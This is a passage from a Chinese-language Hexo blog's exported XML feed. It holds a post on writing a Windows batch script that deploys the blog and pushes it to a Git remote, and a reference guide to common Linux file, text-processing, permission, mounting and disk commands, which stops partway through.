<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307112034.png" class>]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>如何编写部署新文章命令脚本</title>
    <url>/2020/03/04/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E5%91%BD%E4%BB%A4%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一般而言，写好的Markdown文章应该放到博客目录的source_posts文件夹下，然后使用命令hexo g -d或者是hexo d -g进行部署。我在使用hexo的时候，我的hexo所有文件还关联着码云上的仓库，我习惯于发表新文章后把hexo的所有文件都更新到码云远端仓库。按以前那种方式，我首先需要在博客目录中用命令部署最新的文章，然后再使用git add .等命令将本地所有文件推送到远端。老实说，我承认自己是个懒人，所以就想到了用批处理文件bat实现我的懒人梦，在那之前我们先了解一下bat。</p>
<a id="more"></a>

<h2 id="bat的简单介绍"><a href="#bat的简单介绍" class="headerlink" title="bat的简单介绍"></a>bat的简单介绍</h2><p>.bat文件有点类似于linux系统下的shell脚本文件.sh， 下面是bat的简单用法，更多关于bat脚本的详细介绍可以查看<a href="https://baike.baidu.com/item/BAT/365230" target="_blank" rel="noopener">这里</a>。 </p>
<table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">echo</td>
<td align="center">表示打印该命令后的字符，如echo hello执行后会打印“hello”</td>
</tr>
<tr>
<td align="center">echo off</td>
<td align="center">表示在此语句后所有运行的命令都不显示命令本身 ，但本身会显示</td>
</tr>
<tr>
<td align="center">@</td>
<td align="center">与echo off相象，但它是加在每个命令行的最前面，表示运行时不显示这一行的命令行（只能影响当前行）</td>
</tr>
<tr>
<td align="center">@echo off</td>
<td align="center">组合上两个语法，表示不显示后续执行命令及当前命令</td>
</tr>
<tr>
<td align="center">dir c:<em>.</em> &gt;a.txt</td>
<td align="center">将c盘文件列表写入a.txt</td>
</tr>
<tr>
<td align="center">call</td>
<td align="center">用于调用另一个批处理命令或文件（如果不用call而直接调用别的批处理文件，那么执行完那个批处理文件后将无法返回当前文件并执行当前文件的后续命令）</td>
</tr>
<tr>
<td align="center">call c:\ucdos\ucdos.bat</td>
<td align="center">调用ucdos.bat脚本</td>
</tr>
<tr>
<td align="center">pause</td>
<td align="center">暂停批处理的执行并在屏幕上显示Press any key to continue…的提示，等待用户按任意键后继续</td>
</tr>
<tr>
<td align="center">rem</td>
<td align="center">用于注释，也可以用 ::代替</td>
</tr>
<tr>
<td align="center">start</td>
<td align="center">调起另外一个窗口执行当前行命令</td>
</tr>
</tbody></table>
<h2 id="编写部署脚本"><a href="#编写部署脚本" class="headerlink" title="编写部署脚本"></a>编写部署脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:</span><br><span class="line">cd D:\private\blog</span><br><span class="line">call hexo clean</span><br><span class="line">call hexo g</span><br><span class="line">call hexo d&amp;&amp;cd ..&amp;&amp;git add .&amp;&amp;git commit -m %1&amp;&amp;git push&amp;&amp;cd blog</span><br></pre></td></tr></table></figure>

<p>将上述命令保存为xxx.bat</p>
<p>关于call的用法上面表格有说明，这里还有几个“&amp;&amp;”，这个操作符是当“&amp;&amp;”前面的运行成功后后面的才运行，而“%1”是指向bat文件中传递参数中的第一个（第0个是命令本身），更多的bat传递参数方法可以参照<a href="https://blog.csdn.net/yunnying/article/details/12010779" target="_blank" rel="noopener">这篇文章</a>,然后就可以在.bat文件所在的文件夹中打开cmd窗口或者shell（鼠标右键+shift）窗口，键入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxx "提交备注"</span><br></pre></td></tr></table></figure>

<p>就可以实现一键部署新文章且更新远程代码仓库啦！当然了如果脚本中不需要传递参数，则只需双击xxx.bat打开就可以了。</p>
]]></content>
      <categories>
        <category>命令行</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>效率</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常用命令</title>
    <url>/2020/02/25/%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<blockquote>
<p>本文篇幅较大，下面是目录<br><a href="#Bash快捷键">Bash快捷键</a><br><a href="#文件及目录操作命令">文件及目录操作命令</a><br><a href="#权限相关命令">权限相关命令</a><br><a href="#重定向与管道命令">重定向相关与管道命令</a><br><a href="#挂载文件系统">挂载文件系统</a><br><a href="#磁盘管理">磁盘管理</a></p>
</blockquote>
<h2 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h2><p>删除光标到行首的所有字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctl + U</span><br></pre></td></tr></table></figure>

<p>删除当前光标到前边的最近一个空格之间的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctl + W</span><br></pre></td></tr></table></figure>

<h2 id="文件及目录操作命令"><a href="#文件及目录操作命令" class="headerlink" title="文件及目录操作命令"></a>文件及目录操作命令</h2><h3 id="显示当前所在目录-绝对路径"><a href="#显示当前所在目录-绝对路径" class="headerlink" title="显示当前所在目录 (绝对路径)"></a>显示当前所在目录 (绝对路径)</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br></pre></td></tr></table></figure>

<h3 id="进入某个目录"><a href="#进入某个目录" class="headerlink" title="进入某个目录"></a>进入某个目录</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> [path]</span></span><br></pre></td></tr></table></figure>

<p>  若path缺省，则会进入到用户主目录</p>
<h3 id="列出当前目录下所有的文件"><a href="#列出当前目录下所有的文件" class="headerlink" title="列出当前目录下所有的文件"></a>列出当前目录下所有的文件</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls [选项] [目录或者文件]</span></span><br></pre></td></tr></table></figure>

<p>  <strong>说明</strong> 对于目录，该命令列出其中所有的子目录和文件，缺省情况下是指向当前目录；对于文件，该命令列出文件名及其相关的文件属性信息。该命令常用选项如下表所示。</p>
<p><a name="权限相关命令1"></a></p>
<a id="more"></a>



<table>
<thead>
<tr>
<th><strong>常用选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>All。列出目录中全部文件，包含隐藏文件、父目录和当前目录。</td>
</tr>
<tr>
<td>- l</td>
<td>long。列出目录内容的细节，包括权限、所有者、组群、大小等。</td>
</tr>
<tr>
<td>-F</td>
<td>File type。在每一个列举项目后添加符号表明其类型。</td>
</tr>
<tr>
<td>-R</td>
<td>递归列举当前目录下所有目录的内容。</td>
</tr>
<tr>
<td>-S</td>
<td>Size。按文件大小排序。</td>
</tr>
</tbody></table>
<h3 id="显示文本文件"><a href="#显示文本文件" class="headerlink" title="显示文本文件"></a>显示文本文件</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat fileName</span></span><br></pre></td></tr></table></figure>
<p>  <strong>注意</strong> fileName需要包含路径，若不指明，则认为是当前目录,若要显示行数，添加-n选项即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat fileName -n</span></span><br></pre></td></tr></table></figure>

<p>查看前5行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> head -5 fileName</span></span><br></pre></td></tr></table></figure>

<p>查看后5行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tail -5 filename</span></span><br></pre></td></tr></table></figure>

<p>查看两个文件之间的差异</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> diff filename1 filename2</span></span><br></pre></td></tr></table></figure>

<h3 id="文件或目录的复制"><a href="#文件或目录的复制" class="headerlink" title="文件或目录的复制"></a>文件或目录的复制</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp [选项] 源文件或目录 目标目录</span></span><br></pre></td></tr></table></figure>

<p>  若指定多个源文件或者目录复制到目标目录，则源文件或源目录之间用空格分隔，常用选项若下表</p>
<table>
<thead>
<tr>
<th><strong>常用选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>在备份中尽可能多的保持源文件的结构和属性。</td>
</tr>
<tr>
<td>- f</td>
<td>覆盖已经存在的目标文件而不加以提示。</td>
</tr>
<tr>
<td>- i</td>
<td>在覆盖目标文件前给出提示并要求用户确认。</td>
</tr>
<tr>
<td>-r</td>
<td>若源文件为目录，递归复制该目录下所有子目录和文件。</td>
</tr>
</tbody></table>
<h3 id="文件或目录的移动（重命名）"><a href="#文件或目录的移动（重命名）" class="headerlink" title="文件或目录的移动（重命名）"></a>文件或目录的移动（重命名）</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mv 源文件或者目录 目标文件或目录</span></span><br></pre></td></tr></table></figure>

<p>  当目标目录不存在时，则将源文件或目录重命名；若需要将多个文件夹或者文件移到源文件，可用下面的命令</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mv 文件1 文件2 文件3 ... -t 目标文件夹</span></span><br></pre></td></tr></table></figure>

<h3 id="建立新目录"><a href="#建立新目录" class="headerlink" title="建立新目录"></a>建立新目录</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir [选项] 目录名</span></span><br></pre></td></tr></table></figure>

<p>  该命令需要用户拥有写的权利</p>
<h3 id="删除文件或者目录"><a href="#删除文件或者目录" class="headerlink" title="删除文件或者目录"></a>删除文件或者目录</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rm [选项] 文件或者目录</span></span><br></pre></td></tr></table></figure>

<p>  若需要删除多个文件或者文件夹，则文件或文件夹之间用空格隔开</p>
<p>  常用的选项如下</p>
<table>
<thead>
<tr>
<th><strong>常用选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-f</td>
<td>不给出提示，强行删除。</td>
</tr>
<tr>
<td>- r</td>
<td>删除文件列表中指定的目录，若无此标志则不删除目录。</td>
</tr>
<tr>
<td>- i</td>
<td>提示是否删除。</td>
</tr>
<tr>
<td>-R</td>
<td>递归删除目录，删除整个目录及其所有子目录。</td>
</tr>
</tbody></table>
<h3 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h3><p>按照名字搜索</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -name <span class="string">"*.txt"</span> <span class="comment"># 在当前目录下查找所有txt文件</span></span></span><br></pre></td></tr></table></figure>

<p>也可以查找所有非<code>.txt</code>文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . ! -name <span class="string">"*.txt"</span></span></span><br></pre></td></tr></table></figure>

<p>按照条件</p>
<table>
<thead>
<tr>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-atime</td>
<td>访问时间，单位是天</td>
</tr>
<tr>
<td>-amin</td>
<td>访问时间，单位是分钟</td>
</tr>
<tr>
<td>-mtime</td>
<td>修改时间 ，单位是天（内容发生变动)</td>
</tr>
<tr>
<td>-mmin</td>
<td>修改时间 ，单位是分钟（内容发生变动)</td>
</tr>
<tr>
<td>-size -n</td>
<td>大小小于n个字节的文件</td>
</tr>
<tr>
<td>-size +n</td>
<td>大小大于n个字节的文件</td>
</tr>
<tr>
<td>-perm</td>
<td>按照权限</td>
</tr>
<tr>
<td>-user</td>
<td>按用户</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -amin -5 -<span class="built_in">type</span> f <span class="comment"># 最近5分钟访问的文件</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -size -1k  <span class="comment"># 查找低于1kb的文件</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -perm 644 <span class="comment"># 查找权限是644的文件， 权限的知识在下面</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -user yalexin <span class="comment"># 查找yalexin用户拥有的文件</span></span></span><br></pre></td></tr></table></figure>

<h3 id="grep文本搜索"><a href="#grep文本搜索" class="headerlink" title="grep文本搜索"></a>grep文本搜索</h3><p>语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep match_patten  [参数] fileName</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-o</td>
<td>只输出匹配的文本，如在<code>1,txt</code>中寻找<code>test</code>：<code>grep &quot;test&quot; -o 1.txt</code></td>
</tr>
<tr>
<td>-v</td>
<td>只输出没有匹配的文本</td>
</tr>
<tr>
<td>-c</td>
<td>统计匹配的字段在文本中出现的次数。如在<code>1,txt</code>中寻找<code>a</code>的个数：<code>grep &quot;a&quot; -c 1.txt</code></td>
</tr>
<tr>
<td>-n</td>
<td>打印匹配的行号</td>
</tr>
<tr>
<td>-i</td>
<td>忽略大小写，如在<code>1,txt</code>中寻找<code>a</code>或者<code>A</code>：<code>grep &quot;a&quot; -i 1.txt</code></td>
</tr>
</tbody></table>
<h3 id="sort排序"><a href="#sort排序" class="headerlink" title="sort排序"></a>sort排序</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-n</td>
<td>按数字进行排序</td>
</tr>
<tr>
<td>-d</td>
<td>按字典序进行排序</td>
</tr>
<tr>
<td>-r</td>
<td>逆序排序</td>
</tr>
<tr>
<td>-k n</td>
<td>指定按第N列排序</td>
</tr>
</tbody></table>
<p>例如，将<code>1.txt</code>文件中的第一列按照数字，以行为单位逆序排列：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sort -nrk 1 1.txt</span></span><br></pre></td></tr></table></figure>

<h3 id="uniq-消除重复行"><a href="#uniq-消除重复行" class="headerlink" title="uniq 消除重复行"></a>uniq 消除重复行</h3><p>不重复显示<code>1.txt</code>的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq</span></span><br></pre></td></tr></table></figure>

<p>统计文本中各行出现的次数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq -c</span></span><br></pre></td></tr></table></figure>

<p>找出重复行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq -d</span></span><br></pre></td></tr></table></figure>

<h3 id="cut切割文本"><a href="#cut切割文本" class="headerlink" title="cut切割文本"></a>cut切割文本</h3><p><code>cut</code> 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p>
<p><code>cut</code>可以将文件作为数据源,也可以通过管道的方式指定数据源地方</p>
<p>语法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cut 参数 数据</span></span><br></pre></td></tr></table></figure>

<p>主要参数:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-b</td>
<td>按字节为单位切割</td>
</tr>
<tr>
<td>-c</td>
<td>按字符为单位切割</td>
</tr>
<tr>
<td>-d</td>
<td>自定义分隔符，默认为制表符</td>
</tr>
<tr>
<td>-f</td>
<td>制定切割的区间</td>
</tr>
<tr>
<td>-n</td>
<td>取消分割多字节字符</td>
</tr>
</tbody></table>
<p>例如：<code>ls -l | cut -c 1-10</code>可以显示出当前文件夹下所有文件和文件夹的权限。</p>
<p>特别要注意一下，假如我们想要用<code>-b</code>提取每一行的中文时，要注意，在<code>utf-8</code>的编码下一个汉字占用3个字节，如果开始和结束位置没有定位正确，切割的结果将会有乱码现象。</p>
<h3 id="paste拼接文本"><a href="#paste拼接文本" class="headerlink" title="paste拼接文本"></a>paste拼接文本</h3><p>将两个文本文件的内容拼接。</p>
<p>例如：文件一内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>文件二内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文字一</span><br><span class="line">文字二</span><br><span class="line">文字三</span><br><span class="line">文字四</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> paste test1.txt test2.txt</span></span><br><span class="line">1	文字一</span><br><span class="line">2	文字二</span><br><span class="line">3	文字三</span><br><span class="line">4	文字四</span><br></pre></td></tr></table></figure>

<p>默认是以制表符（Tab）为定界符，可以利用<code>-d</code>制定定界符，如以空格：<code>paste test1.txt test2.txt -d &quot; &quot;</code></p>
<h3 id="wc统计工具"><a href="#wc统计工具" class="headerlink" title="wc统计工具"></a>wc统计工具</h3><p>统计行数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -l fileName</span></span><br></pre></td></tr></table></figure>

<p>统计单词数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -w fileName</span></span><br></pre></td></tr></table></figure>

<p>统计字符数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -c fileName</span></span><br></pre></td></tr></table></figure>

<h3 id="sed文本替换"><a href="#sed文本替换" class="headerlink" title="sed文本替换"></a>sed文本替换</h3><p>将第一个匹配的内容替换：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/原内容/新内容/'</span> fileName</span></span><br></pre></td></tr></table></figure>

<p>全局替换：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/原内容/新内容/g'</span> fileName</span></span><br></pre></td></tr></table></figure>

<p>默认情况下是显示替换后的内容，对原文件不修改，假如想要修改原文件，加上<code>-i</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/原内容/新内容/g'</span> fileName -i</span></span><br></pre></td></tr></table></figure>

<p>或者将修改后的内容放到新文件中：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/原内容/新内容/g'</span> fileName &gt; newFileName</span></span><br></pre></td></tr></table></figure>

<h2 id="权限相关命令"><a href="#权限相关命令" class="headerlink" title="权限相关命令"></a>权限相关命令</h2><p><strong>权限的含义</strong>：Linux系统中的每个文件和目录都有相应的访问许可权限，访问权限分为只读（r），可写（w）和可执行（x）三种。有三种不同类型的用户可对文件或目录进行访问，分别是文件所有者（u），同组用户（g）和其他用户（o）。所有的文件和目录都被创建它们的人所“拥有”，只要你是这个文件的所有者或你登录为根用户，你就拥有了改变所有者、组群和其他人权限的权利。</p>
<h3 id="查看当前文件夹下的文件夹或者文件的权限"><a href="#查看当前文件夹下的文件夹或者文件的权限" class="headerlink" title="查看当前文件夹下的文件夹或者文件的权限"></a>查看当前文件夹下的文件夹或者文件的权限</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l</span></span><br></pre></td></tr></table></figure>

  <img src="/2020/02/25/%E5%91%BD%E4%BB%A4/1.png" class>

<p>  第一个是说明是文件（-）还是文件夹（d），然后是9个字符，每三个一组，表明了权限属性，分别是所有者、所属组、其他人拥有的权限，</p>
<h3 id="使用文字设定法改变权限"><a href="#使用文字设定法改变权限" class="headerlink" title="使用文字设定法改变权限"></a>使用文字设定法改变权限</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod [用户身份] [操作符][mode] 文件名 [-R]</span></span><br></pre></td></tr></table></figure>

<p>  可改变用户或同组用户或其它用户对指定文件名的存取权限，在文字设定法中，chmod命令各选项含义如下表</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>符号</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>用户身份</td>
<td>u</td>
<td>user,表示文件或目录的所有者。</td>
</tr>
<tr>
<td>用户身份</td>
<td>g</td>
<td>group，表示与文件主同组的用户。</td>
</tr>
<tr>
<td>用户身份</td>
<td>o</td>
<td>other，表示其他用户。</td>
</tr>
<tr>
<td>用户身份</td>
<td>a</td>
<td>all，表示所有用户。</td>
</tr>
<tr>
<td>操作符</td>
<td>＋</td>
<td>增添权限</td>
</tr>
<tr>
<td>操作符</td>
<td>－</td>
<td>删除权限</td>
</tr>
<tr>
<td>操作符</td>
<td>＝</td>
<td>赋予给定权限并取消其它所有权限。</td>
</tr>
<tr>
<td>权限</td>
<td>r</td>
<td>读取权</td>
</tr>
<tr>
<td>权限</td>
<td>w</td>
<td>写入权</td>
</tr>
<tr>
<td>权限</td>
<td>x</td>
<td></td>
</tr>
<tr>
<td></td>
<td>-R</td>
<td>递归修改子目录及文件</td>
</tr>
</tbody></table>
<p>  如给所有者添加执行权限</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod u+x 45</span></span><br></pre></td></tr></table></figure>
  <img src="/2020/02/25/%E5%91%BD%E4%BB%A4/2.png" class>

<p>  也可以给多个用户修改权限</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod u+x,g+w 文件名</span></span><br></pre></td></tr></table></figure>

<h3 id="使用数字法改变权限"><a href="#使用数字法改变权限" class="headerlink" title="使用数字法改变权限"></a>使用数字法改变权限</h3><p>  首先说明w、x、r、的权值如下</p>
<p>  r ———- 4</p>
<p>  w ——— 2</p>
<p>  x ———- 1</p>
<p>  因此一组权限的组合可以由下表所示</p>
<table>
<thead>
<tr>
<th>数字和</th>
<th>权限组合</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>—</td>
</tr>
<tr>
<td>1</td>
<td>–x</td>
</tr>
<tr>
<td>2</td>
<td>-w-</td>
</tr>
<tr>
<td>3</td>
<td>-wx</td>
</tr>
<tr>
<td>4</td>
<td>r–</td>
</tr>
<tr>
<td>5</td>
<td>r-x</td>
</tr>
<tr>
<td>6</td>
<td>rw-</td>
</tr>
<tr>
<td>7</td>
<td>rwx</td>
</tr>
</tbody></table>
<p>  例如我们想给某个文件或文件夹的权限改成rwxr-x-w-，就可以用命令</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod 752 文件名或者文件夹名</span></span><br></pre></td></tr></table></figure>
<p>  如果熟记上面的对应关系，就可以很方便地修改权限了。</p>
<h2 id="重定向与管道命令"><a href="#重定向与管道命令" class="headerlink" title="重定向与管道命令"></a>重定向与管道命令</h2><p>Linux默认的标准输入（stdin）是键盘，标准输出（stdout）是显示器。如果需要从非标准输入输出设备进行输入或输出，则需要通过输入输出重定向。</p>
<h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><p>如：命令 &lt; 文件名</p>
<p>将命令（或可执行程序）的标准输入重定向到指定的文件中。</p>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat &lt; /etc.txt1</span></span><br></pre></td></tr></table></figure>
<p>表示将/etc.txt1的文件内容作为cat命令的输入，显示到屏幕。</p>
<h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>如：命令 &gt; 文件名</p>
<p> 将命令（或可执行程序）的标准输出或标准错误输出重定向到指定文件中。</p>
<p>例如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls  /etc &gt; /test1/etc.txt</span></span><br></pre></td></tr></table></figure>
<p>表示将/etc目录下的文件列表输出到文件/text1/etc.txt中。</p>
<h3 id="追加重定向"><a href="#追加重定向" class="headerlink" title="追加重定向"></a>追加重定向</h3><p>如：  命令 &gt;&gt; 文件名</p>
<p>表示将一条命令（或可执行程序）的输出结果追加到指定文件的后面。</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>如： 命令 | 命令</p>
<p>表示将一个命令（或程序）的输出作为另一个命令（或程序）的输入。</p>
<h2 id="挂载文件系统"><a href="#挂载文件系统" class="headerlink" title="挂载文件系统"></a>挂载文件系统</h2><h3 id="fdisk命令"><a href="#fdisk命令" class="headerlink" title="fdisk命令"></a>fdisk命令</h3><p>fdisk命令用于观察硬盘实体使用情况，也可对硬盘分区。它采用传统的问答式界面，而非类似DOS fdisk的cfdisk互动式操作界面，因此在使用上较为不便，但功能却丝毫不打折扣。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fdisk(选项)(参数)</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>-b&lt;分区大小&gt;</td>
<td>指定每个分区的大小</td>
</tr>
<tr>
<td>-l</td>
<td>列出指定的外围设备的分区表状况</td>
</tr>
<tr>
<td>-s&lt;分区编号&gt;</td>
<td>将指定的分区大小输出到标准输出上，单位为区块</td>
</tr>
<tr>
<td>-u</td>
<td>搭配”-l”参数列表，会用分区数目取代柱面数目，来表示每个分区的起始地址</td>
</tr>
<tr>
<td>-v</td>
<td>显示版本信息</td>
</tr>
</tbody></table>
<p>参数：指定要进行分区或者显示分区的硬盘设备文件。</p>
<h3 id="挂载命令"><a href="#挂载命令" class="headerlink" title="挂载命令"></a>挂载命令</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount [选项] 设备 存放目录</span></span><br></pre></td></tr></table></figure>

<p>该命令可以将Linux支持的文件系统挂载到指定的目录。常用选项如下表所示：</p>
<table>
<thead>
<tr>
<th>常用选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>挂上/etc/fstab下列出的全部文件系统</td>
</tr>
<tr>
<td>-t</td>
<td>指定挂上的文件系统的名称</td>
</tr>
<tr>
<td>-n</td>
<td>挂上文件系统时不把文件系统的数据写入/etc/mtab中</td>
</tr>
<tr>
<td>-w</td>
<td>将文件系统设定为可读写</td>
</tr>
</tbody></table>
<h3 id="挂载软盘"><a href="#挂载软盘" class="headerlink" title="挂载软盘"></a>挂载软盘</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/fd0  /mnt/floppy</span></span><br></pre></td></tr></table></figure>
<p>事先在/mnt/目录下建立floppy目录，之后将设备号为fd0的软盘挂载到该目录。</p>
<h3 id="挂载U盘"><a href="#挂载U盘" class="headerlink" title="挂载U盘"></a>挂载U盘</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/sda1  /mnt/usb</span></span><br></pre></td></tr></table></figure>
<p>在/mnt/目录下建立usb目录，将设备号为sda1的U盘挂载到该目录。</p>
<h3 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount  /dev/cdrom  /mnt/cdrom</span></span><br></pre></td></tr></table></figure>
<p>在/mnt/目录下建立cdrom目录，将设备名为cdrom的光盘挂载到该目录。</p>
<h3 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h3><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> umount 设备</span></span><br></pre></td></tr></table></figure>
<p>该命令可将已经挂载的指定设备进行卸载。某些设备，如光盘，若不卸载将无法取出。</p>
<h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><h3 id="查看磁盘空间"><a href="#查看磁盘空间" class="headerlink" title="查看磁盘空间"></a>查看磁盘空间</h3><p>查看磁盘大小和利用率：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> df -h</span></span><br></pre></td></tr></table></figure>

<p><code>-h</code>是以易读的方向显现，自动更改单位，即GB/MB/KB，不加该选项则以B为单位显示。</p>
<p>查看当前目录占用空间大小：</p>
